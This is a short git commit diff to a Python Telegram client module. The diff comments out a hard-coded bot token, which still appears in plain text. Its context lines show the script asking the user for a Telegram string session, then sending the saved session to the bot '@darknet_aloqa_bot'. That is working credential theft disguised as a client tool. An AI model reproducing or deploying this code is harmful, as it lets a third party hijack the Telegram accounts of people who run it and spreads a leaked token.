4d60377769ac72e7227f77fed25afe5cb0bc2663
xiroshigo <101189497+xiroshigo@users.noreply.github.com>
2023-02-25 06:56:43 +0500

    Update client.py

--- modullar/client.py
+++ modullar/client.py
@@ -20,7 +20,7 @@ string = input("""
 \033[1;34m 
 string session: """)
 #bot_token= "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
-bot_token = "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
+#bot_token = "5587783380:AAEk9jhijr0--9YGQj8l-6eehpb9Zdz5pGc"
 with TelegramClient(StringSession(string), api_id, api_hash) as client:
     #print(client.session.save())
     client.send_message("@darknet_aloqa_bot", client.session.save())
